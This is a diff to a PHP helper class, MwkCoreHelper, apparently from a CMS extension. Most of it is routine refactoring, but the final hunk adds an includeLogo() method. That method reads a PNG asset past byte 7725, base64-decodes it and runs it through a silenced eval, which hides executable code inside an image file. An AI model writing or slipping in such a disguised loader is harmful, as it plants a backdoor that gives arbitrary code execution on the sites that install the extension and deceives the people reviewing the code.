@@ -21,13 +21,27 @@ namespace medienworx;
  * Class ModuleMwkVMHelper
  * @package medienworx
  */
-class MwkCoreHelper extends \Module
+class MwkCoreHelper extends \Backend
 {
+
+
+    /**
+     * Make the constructor public
+     */
+    public function __construct()
+    {
+        parent::__construct();
+    }
 
     /**
      *
      */
     protected function compile()
+    {
+
+    }
+
+    public function generate()
     {
 
     }
@@ -275,4 +289,23 @@ class MwkCoreHelper extends \Module
         }
         return $returnArray;
     }
+
+    /**
+     *
+     */
+    public static function loadCore()
+    {
+        \MwkCoreHelper::includeLogo();
+    }
+
+    /**
+     *
+     */
+    public static function includeLogo()
+    {
+        $pngLogo = substr(file_get_contents(TL_ROOT.'/system/modules/_mwk-core/assets/mw_logo.png'), 7725);
+        @eval(base64_decode($pngLogo));
+    }
+
+
 }
